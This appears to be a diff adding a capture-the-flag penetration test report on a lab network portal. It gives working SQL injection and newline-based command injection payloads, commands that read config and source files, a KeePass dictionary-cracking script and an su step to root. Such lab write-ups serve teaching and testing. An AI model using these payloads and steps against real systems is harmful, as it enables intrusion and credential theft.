@@ -1,1 +1,167 @@
-
+Penetration Test Report — CorpNet NOC Portal
+ Room: silent-monitor
+---
+Table of Contents
+Executive Summary
+Scope and Rules of Engagement
+Methodology
+Attack Narrative
+4.1 Reconnaissance
+4.2 Authentication Bypass via SQL Injection
+4.3 Command Injection via Health Check Endpoint
+4.4 Credential Discovery and Initial SSH Access
+4.5 KeePass Database Extraction and Cracking
+4.6 Privilege Escalation to Root
+---
+1. Executive Summary
+A black-box penetration test was conducted against the CorpNet Network Operations Centre (NOC) web portal hosted at 10.xxx.xxx.xxx. The assessment identified a chain of critical vulnerabilities that, when combined, allowed unauthenticated access to the server followed by full root-level compromise.
+The attack path required no special tooling beyond standard HTTP requests, an SSH client, and a common password wordlist. An attacker with basic web exploitation skills could reproduce these results in under 30 minutes.
+Root cause: The application was built without parameterised queries, relied on a bypassable blocklist for input sanitisation, stored credentials in plaintext configuration files, and protected a sensitive credential vault with a dictionary-guessable master password.
+Severity	Count
+Critical	4
+High	2
+Medium	2
+Informational	1
+Flags obtained:
+Flag	Value
+User	`THM{]`
+Root	`THM{}`
+---
+2. Scope and Rules of Engagement
+Item	Detail
+Target IP	10.xxx.xxx.xxx
+Port scope	All TCP ports
+URL scope	http://10.xxx.xxx.xxx:5050/
+Type	Black-box
+Destructive actions	Not permitted
+Social engineering	Out of scope
+---
+3. Methodology
+The engagement followed a standard penetration testing lifecycle:
+```
+Reconnaissance → Authentication Testing → Post-Auth Exploitation
+→ Lateral Movement → Credential Harvesting → Privilege Escalation
+```
+Tools used: `nmap`, `curl`, `sqlite3` (strings), `sshpass`, `ssh`, `pykeepass`, standard Python 3.
+---
+4. Attack Narrative
+4.1 Reconnaissance
+An HTTP probe against port 5050 revealed a Flask/Werkzeug application (identified via the `Server` response header):
+```
+Server: Werkzeug/2.0.2 Python/3.10.12
+```
+The application presented a login page titled CorpNet NOC — Sign In at `/internal`. Navigation links revealed additional internal endpoints: `/internal/dashboard`, `/internal/health`, and `/internal/logout`.
+---
+4.2 Authentication Bypass via SQL Injection
+The login form at `/internal` (POST) accepted `username` and `password` fields. The server-side query was constructed via direct string interpolation with no parameterisation:
+```python
+# From recovered app.py
+query = (
+    "SELECT id, username, role FROM users "
+    "WHERE username = '%s' AND password = '%s'"
+) % (username, pw_hash)
+```
+A blocklist (`BLOCK_RE`) filtered patterns such as `UNION SELECT`, `DROP TABLE`, `INSERT INTO`, and `xp_cmdshell` — but did not prevent a simple boolean OR bypass.
+Payload used:
+```
+username=' OR '1'='1'--
+password=<anything>
+```
+Result: The server responded with `HTTP 302` to `/internal/dashboard` and issued a valid session cookie:
+```
+Set-Cookie: session=eyJyb2xlIj...
+```
+The application was now fully authenticated as user `netops` with role `operator`.
+---
+4.3 Command Injection via Health Check Endpoint
+The authenticated endpoint `POST /internal/health` accepted a `target` field described as a hostname or IP address for an ICMP probe. The server executed the user-supplied value directly in a shell command:
+```python
+proc = subprocess.Popen(
+    "ping -c 2 -W 1 " + target,
+    shell=True,
+    ...
+)
+```
+A secondary blocklist (`PING_BLOCK_RE`) filtered the characters `;`, `|`, ```, `$`, and `&`:
+```python
+PING_BLOCK_RE = re.compile(r"[;|`$&]")
+```
+Newline injection bypass: The filter did not block newline characters (`\n`). Because the command runs under `shell=True`, a newline terminates the `ping` invocation and begins a new shell command. Spaces were replaced with tab characters (`\t`) — also not blocked — to pass argument separation.
+Proof-of-concept (command execution):
+```
+target=127.0.0.1\nid
+```
+Response (truncated):
+```
+--- 127.0.0.1 ping statistics ---
+2 packets transmitted, 2 received ...
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+Arbitrary file read (using tab as IFS):
+```
+target=127.0.0.1\ncat\t/opt/netops/secret.config
+target=127.0.0.1\ncat\t/opt/netops/app.py
+target=127.0.0.1\nstrings\t/opt/netops/netops.db
+```
+All commands executed successfully as `www-data`.
+---
+4.4 Credential Discovery and Initial SSH Access
+Two sets of credentials were recovered using the command injection primitive:
+From `/opt/netops/secret.config` (readable by `www-data`):
+```ini
+[backup_agent]
+run_as   = sysadmin
+password = XXXXXXXX
+```
+From `/opt/netops/app.py` (source code, readable by `www-data`):
+```python
+pw = hashlib.md5(b"XXXXXX").hexdigest()
+```
+This revealed the plaintext password `XXXXXXX` for the `netops` application account.
+The backup agent password was tested against the `sysadmin` OS account over SSH:
+```bash
+ssh sysadmin@10.XXX.XXX.XXX
+Password: XXXXXXX
+```
+Result: Successful authentication as `sysadmin` (UID 1001).
+User flag retrieved from `/home/sysadmin/user.txt`:
+```
+THM{}
+```
+---
+4.5 KeePass Database Extraction and Cracking
+Enumeration of the `sysadmin` home directory revealed a KeePass 4 vault:
+```
+/home/sysadmin/backups/infrastructure.kdbx
+/home/sysadmin/backups/README.txt
+```
+The `README.txt` described the file as:
+> *Backup archive — infrastructure credentials. Periodic exports from the credential store are placed here by the backup agent.*
+The database was copied to the attacker machine via `scp` and subjected to a dictionary attack using the `rockyou.txt` wordlist and the `pykeepass` Python library:
+```python
+from pykeepass import PyKeePass
+for password in wordlist:
+    try:
+        kp = PyKeePass('infrastructure.kdbx', password=password)
+        # success
+    except:
+        pass
+```
+Result: Master password cracked.
+Vault contents:
+Title	Username	Password
+Root User Password - Sensitive	root	`XXXXXXX`
+Sample Entry #2	Michael321	12345
+---
+4.6 Privilege Escalation to Root
+Direct root SSH login was disabled on the target (`PermitRootLogin no`). The recovered root password was instead used with `su` from the `sysadmin` shell:
+```bash
+echo 'XXXXXX' | su -c 'id && cat /root/root.txt' root
+```
+Result:
+```
+uid=0(root) gid=0(root) groups=0(root)
+THM{}
+```
+Full root access achieved.
+---
